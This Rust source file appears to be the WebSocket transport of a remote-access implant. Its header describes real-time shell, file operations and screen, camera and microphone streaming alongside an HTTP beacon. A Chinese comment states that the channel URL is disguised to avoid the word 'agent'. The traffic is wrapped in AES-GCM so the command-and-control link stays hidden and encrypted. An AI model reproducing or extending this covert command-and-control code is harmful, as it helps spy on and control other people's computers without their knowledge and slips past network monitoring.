//! WebSocket communicator — real-time shell, file ops, screen/camera/mic streaming.
//! Port of WsCommunicator.cs.
//!
//! The WebSocket is split into independent send and receive halves so that
//! spawned tasks (screen capture loop, etc.) can send frames without being
//! blocked by the main receive loop holding the read lock.
//!
//! When a session key is set (after registration), every message is wrapped in
//! an AES-256-GCM envelope `{ "e": "<base64>" }` so the realtime channel is
//! encrypted end-to-end with the same key as the HTTP beacon.

use futures_util::{SinkExt, StreamExt};
use futures_util::stream::{SplitSink, SplitStream};
use libra_common::protocol::WebSocketMessage;
use serde_json::Value;
use tokio::net::TcpStream;
use tokio_tungstenite::{MaybeTlsStream, WebSocketStream, connect_async};
use tokio_tungstenite::tungstenite::Message;

type WsStream = WebSocketStream<MaybeTlsStream<TcpStream>>;
type WsWrite = SplitSink<WsStream, Message>;

/// Shared key holder used by the sender and receiver halves.
type KeyHandle = std::sync::Arc<std::sync::RwLock<Option<[u8; 32]>>>;

/// Cloneable send-half handle so spawned tasks can send without contending
/// with the receive lock on WsCommunicator. Carries the session key so all
/// senders encrypt consistently.
#[derive(Clone)]
pub struct WsSender {
    write: std::sync::Arc<tokio::sync::Mutex<Option<WsWrite>>>,
    key: KeyHandle,
}

impl WsSender {
    fn wrap(&self, json: String) -> Result<String, String> {
        let key = self.key.read().unwrap().clone();
        wrap_outgoing(json, &key)
    }
}

/// WebSocket communicator for real-time agent operations.
pub struct WsCommunicator {
    write_half: WsSender,
    read_half: Option<SplitStream<WsStream>>,
    key: KeyHandle,
    url: String,
}

impl WsCommunicator {
    pub fn new(base_url: &str, agent_id: &str) -> Self {
        let url = base_url
            .replace("http://", "ws://")
            .replace("https://", "wss://");

        let ws_url = if let Some(rest) = url.strip_prefix("ws://localhost") {
            format!("ws://127.0.0.1{}", rest)
        } else if let Some(rest) = url.strip_prefix("wss://localhost") {
            format!("wss://127.0.0.1{}", rest)
        } else {
            url.clone()
        };

        // 实时通道伪装：/ws/realtime?channel=<token>（无 agent 字样）
        let ws_uri = if let Some(rest) = ws_url.strip_prefix("ws://") {
            let parts: Vec<&str> = rest.splitn(2, '/').collect();
            format!("ws://{}/ws/realtime?channel={}", parts[0], agent_id)
        } else if let Some(rest) = ws_url.strip_prefix("wss://") {
            let parts: Vec<&str> = rest.splitn(2, '/').collect();
            format!("wss://{}/ws/realtime?channel={}", parts[0], agent_id)
        } else {
            format!("ws://127.0.0.1:5270/ws/realtime?channel={}", agent_id)
        };

        let key: KeyHandle = std::sync::Arc::new(std::sync::RwLock::new(None));
        let write_half = WsSender {
            write: std::sync::Arc::new(tokio::sync::Mutex::new(None)),
            key: key.clone(),
        };

        Self {
            write_half,
            read_half: None,
            key,
            url: ws_uri,
        }
    }

    pub fn is_connected(&self) -> bool {
        self.read_half.is_some()
    }

    /// Enable AES-GCM encryption on this channel.
    pub fn set_session_key(&self, key: [u8; 32]) {
        *self.key.write().unwrap() = Some(key);
    }

    /// Returns a cloneable sender handle for spawned tasks.
    pub fn sender(&self) -> WsSender {
        self.write_half.clone()
    }

    /// Connect to the WebSocket endpoint.
    pub async fn connect(&mut self) -> Result<(), String> {
        let (ws, _) = connect_async(&self.url).await.map_err(|e| e.to_string())?;
        let (write, read) = ws.split();
        *self.write_half.write.lock().await = Some(write);
        self.read_half = Some(read);
        Ok(())
    }

    /// Receive the next WebSocket message. Returns None on connection close or error.
    pub async fn receive(&mut self) -> Option<WebSocketMessage> {
        let read = self.read_half.as_mut()?;

        loop {
            let msg = match read.next().await? {
                Ok(msg) => msg,
                Err(_) => return None,
            };

            match msg {
                Message::Text(text) => {
                    let key = self.key.read().unwrap().clone();
                    let json = unwrap_incoming(&text, &key);
                    return WebSocketMessage::from_json(&json);
                }
                Message::Binary(data) => {
                    if let Ok(text) = String::from_utf8(data) {
                        let key = self.key.read().unwrap().clone();
                        let json = unwrap_incoming(&text, &key);
                        return WebSocketMessage::from_json(&json);
                    }
                }
                Message::Close(_) => return None,
                Message::Ping(_) | Message::Pong(_) | Message::Frame(_) => {
                    continue;
                }
            }
        }
    }

    /// Send a WebSocket message via the write half.
    async fn send_half(&self, msg: &WebSocketMessage) -> Result<(), String> {
        let mut write = self.write_half.write.lock().await;
        let w = write.as_mut().ok_or("WebSocket not connected")?;
        let json = self.write_half.wrap(msg.to_json())?;
        w.send(Message::Text(json)).await.map_err(|e| e.to_string())
    }

    /// Send a result message using a raw JSON data string.
    pub async fn send_result_raw(
        &self,
        msg_type: &str,
        agent_id: &str,
        data_json: &str,
        request_id: Option<&str>,
    ) -> Result<(), String> {
        let data: Value = serde_json::from_str(data_json).unwrap_or(Value::Null);

        let ts = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_millis() as i64;

        let msg = WebSocketMessage {
            msg_type: msg_type.to_string(),
            channel: agent_id.to_string(),
            data: Some(data),
            timestamp: ts,
            request_id: request_id.map(|s| s.to_string()),
        };

        self.send_half(&msg).await
    }

    /// Close the WebSocket connection gracefully: send a Close frame and flush
    /// so the peer completes its close handshake instead of seeing an abrupt
    /// TCP drop (which surfaces as a WebSocketException on the server side).
    pub async fn close(&mut self) {
        {
            let mut guard = self.write_half.write.lock().await;
            if let Some(w) = guard.as_mut() {
                let _ = w.send(Message::Close(None)).await;
                let _ = w.flush().await;
            }
            *guard = None;
        }
        self.read_half.take();
    }
}

/// Send a pre-built WebSocketMessage using only the sender handle.
/// Messages are silently dropped when no session key is established — plaintext
/// fallback is forbidden.
pub async fn send_msg_via(sender: &WsSender, msg: &WebSocketMessage) {
    let json = match sender.wrap(msg.to_json()) {
        Ok(j) => j,
        Err(e) => {
            libra_common::dlog!("[ws] refusing to send '{}': {}", msg.msg_type, e);
            return;
        }
    };
    let mut write = sender.write.lock().await;
    if let Some(w) = write.as_mut() {
        let _ = w.send(Message::Text(json)).await;
    }
}

/// Send a WebSocket message using only the sender handle — no lock on WsCommunicator.
pub async fn ws_send_via(
    sender: &WsSender,
    agent_id: &str,
    msg_type: &str,
    data_json: &str,
    rid: Option<&str>,
) {
    let data: Value = serde_json::from_str(data_json).unwrap_or(Value::Null);

    let ts = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_millis() as i64;

    let msg = WebSocketMessage {
        msg_type: msg_type.to_string(),
        channel: agent_id.to_string(),
        data: Some(data),
        timestamp: ts,
        request_id: rid.map(|s| s.to_string()),
    };

    send_msg_via(sender, &msg).await;
}

// ── Envelope helpers ────────────────────────────────────────────────────

fn wrap_outgoing(json: String, key: &Option<[u8; 32]>) -> Result<String, String> {
    match key {
        Some(k) => Ok(format!(r#"{{"e":"{}"}}"#, libra_crypto::encrypt_payload(&json, k))),
        None => Err("no session key — refusing to send plaintext".to_string()),
    }
}

fn unwrap_incoming(json: &str, key: &Option<[u8; 32]>) -> String {
    if let Some(k) = key {
        if let Ok(v) = serde_json::from_str::<Value>(json) {
            if let Some(e) = v.get("e").and_then(|x| x.as_str()) {
                if let Ok(plain) = libra_crypto::decrypt_payload(e, k) {
                    return plain;
                }
            }
        }
    }
    json.to_string()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn wrap_without_key_is_error() {
        assert!(wrap_outgoing("{}".into(), &None).is_err());
    }

    #[test]
    fn wrap_then_unwrap_roundtrips() {
        let key = libra_crypto::generate_aes_key();
        let original = r#"{"type":"shell.output","data":{"text":"hi"}}"#;
        let wrapped = wrap_outgoing(original.into(), &Some(key)).unwrap();
        assert!(wrapped.contains("\"e\""));
        let unwrapped = unwrap_incoming(&wrapped, &Some(key));
        assert_eq!(unwrapped, original);
    }

    #[test]
    fn unwrap_plaintext_with_key_is_identity() {
        let key = libra_crypto::generate_aes_key();
        assert_eq!(unwrap_incoming("{}", &Some(key)), "{}");
    }
}
